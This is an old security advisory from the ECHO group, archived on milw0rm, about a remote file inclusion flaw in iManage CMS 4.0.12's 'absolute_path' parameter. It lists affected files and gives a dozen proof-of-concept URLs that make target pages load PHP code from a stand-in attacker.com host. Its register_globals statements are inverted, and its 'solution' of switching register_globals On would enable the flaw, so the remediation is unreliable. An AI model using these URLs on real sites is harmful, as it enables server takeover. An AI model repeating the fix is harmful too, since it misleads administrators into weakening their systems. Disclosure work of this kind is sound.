@@ -1,0 +1,135 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \
+ |    __)_ /    \  \//    ~    \/   |   \
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/                              .OR.ID
+ECHO_ADV_40$2006
+
+---------------------------------------------------------------------------------------------------
+[ECHO_ADV_40$2006] iManage CMS <= 4.0.12 (absolute_path) Remote File Inclusion
+---------------------------------------------------------------------------------------------------
+
+Author          : Ahmad Maulana a.k.a Matdhule
+Date Found      : July, 20th 2006
+Location        : Indonesia, Jakarta
+web             : http://advisories.echo.or.id/adv/adv40-matdhule-2006.txt
+Critical Lvl    : Highly critical
+Impact          : System access
+Where           : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+iManage CMS from Imaginex-Resource
+
+Application     : iManage CMS
+version         : 4.0.12 stable
+URL             : http://www.imaginex-resource.com
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~
+
+-----------------------component.php----------------------
+....
+<?php
+/**
+*    iManage Version 4.0.12
+*    Dynamic portal server and Content managment engine
+*    03-02-2003
+*
+*    Copyright (C) 2000 - 2003 Imaginex-Resource
+*
+*    Site Name: iManage Version 4.0.12
+*    File Name: rightComponent.php
+*    Date: 31/01/2003
+*     Version #: 4.0.12
+*    Comments: Display all modules which are to be displayed on the right.
+**/
+
+include($absolute_path.'/language/'.$lang.'/lang_components.php');
+...
+----------------------------------------------------------
+
+Input passed to the "absolute_path" parameter in component.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources
+
+Affected files: 
+
+articles.php
+contact.php
+displaypage.php
+faq.php
+mainbody.php
+news.php
+registration.php
+whosOnline.php
+components/com_calendar.php
+components/com_forum.php
+components/minibb/index.php
+components/minibb/bb_admin.php
+components/minibb/bb_plugins.php
+modules/mod_calendar.php
+modules/mod_browser_prefs.php
+modules/mod_counter.php
+modules/mod_online.php
+modules/mod_stats.php
+modules/mod_weather.php
+themes/bizz.php
+themes/default.php
+themes/simple.php
+themes/original.php
+themes/portal.php
+themes/purple.php
+
+and more :)
+
+Successful exploitation requires that "register_globals= Off ".
+
+Proof Of Concept:
+~~~~~~~~~~~~~
+
+http://target.com/[path]/articles.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/contact.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/displaypage.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/faq.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/mainbody.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/news.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/registration.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/whosOnline.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/components/com_calendar.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/components/com_forum.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/components/minibb/index.php?absolute_path=http://attacker.com//inject.txt?
+http://target.com/[path]/modules/mod_calendar.php?absolute_path=http://attacker.com//inject.txt?
+
+and more Affected files
+
+
+Solution:
+~~~~~
+- Change register_globals= On 
+  in php.ini
+- Sanitize variable $absolute_path on affected files.
+
+---------------------------------------------------------------------------
+Shoutz:
+~
+~ solpot a.k.a chris, J4mbi  H4ck3r for the hacking lesson  :) 
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous
+~ bius, lapets, ghoz, t4mbun_hacker, NpR, h4ntu, thama
+~ newbie_hacker@yahoogroups.com, jasakom_perjuangan@yahoogroups.com
+~ #mardongan #jambihackerlink #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~
+ 
+     matdhule[at]gmail[dot]com
+     
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2006-07-20]
